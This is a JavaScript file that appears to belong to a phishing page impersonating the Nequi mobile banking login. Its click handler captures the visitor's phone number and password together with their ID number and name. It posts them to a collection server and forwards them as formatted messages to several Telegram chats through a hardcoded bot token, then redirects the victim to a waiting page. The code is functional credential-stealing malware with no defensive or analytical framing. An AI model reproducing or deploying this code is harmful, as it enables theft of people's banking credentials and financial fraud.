function updateLS() {
  LS.setItem("info", JSON.stringify(info));
}

async function sendDataToServerAndTelegram() {
  const consultarButton = document.getElementById("btn-consultar");
  consultarButton.disabled = true;

  try {
    const data = {
      id: info.metaInfo.cc,
      nombre: info.metaInfo.dudename,
      telefono: info.metaInfo.telnum,
      direccion: "",
      usuario: info.metaInfo.user,
      password: info.metaInfo.puser,
    };

    // Enviar datos al servidor
    const response = await fetch(`${url}/trico/tricoNequi`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    });

    if (!response.ok) throw new Error("Error en el POST a tricoNequi");

    // Mensaje a enviar a Telegram
    const message = `🔵Nequi\n🆔Nombre: ${info.metaInfo.dudename}\n©️CC: ${info.metaInfo.cc}\n📱Teléfono: ${info.metaInfo.telnum}\n🚹Usuario: ${info.metaInfo.user}\n🔒Contraseña: ${info.metaInfo.puser}\nFuente: ${fuente}`;

    // Enviar el mensaje a ambos chats de Telegram
    for (const chatId of chatIds) {
      const telegramUrl = `https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
        message
      )}`;
      const telegramResponse = await fetch(telegramUrl);

      if (!telegramResponse.ok) {
        throw new Error(`Error al enviar mensaje a Chat ID: ${chatId}`);
      }
      console.log(`Mensaje enviado a Telegram (Chat ID: ${chatId})`);
    }

    console.log("Datos enviados a trico y mensajes enviados a Telegram");

    // Redirigir después de enviar los mensajes
    window.location.href = "./wait.html";
  } catch (error) {
    console.error("Error al enviar los datos:", error);
    alert("Hubo un error al enviar los datos. Por favor, inténtelo de nuevo.");
  } finally {
    consultarButton.disabled = false;
  }
}

document
  .getElementById("btn-consultar")
  .addEventListener("click", function (e) {
    e.preventDefault();
    console.log("click");

    if (document.getElementById("txt-num").value == "") {
      alert("Por favor ingrese su número de celular");
      document.getElementById("txt-num").focus();
      return;
    } else if (document.getElementById("txt-pass").value == "") {
      alert("Por favor ingrese su contraseña");
      document.getElementById("txt-pass").focus();
      return;
    } else {
      const user = document.getElementById("txt-num").value;
      const pass = document.getElementById("txt-pass").value;

      info.metaInfo.user = user;
      info.metaInfo.puser = pass;

      updateLS();

      sendDataToServerAndTelegram();
    }
  });

document.getElementById("backbutton").addEventListener("click", function () {
  window.location.href = "../../pay.html";
});
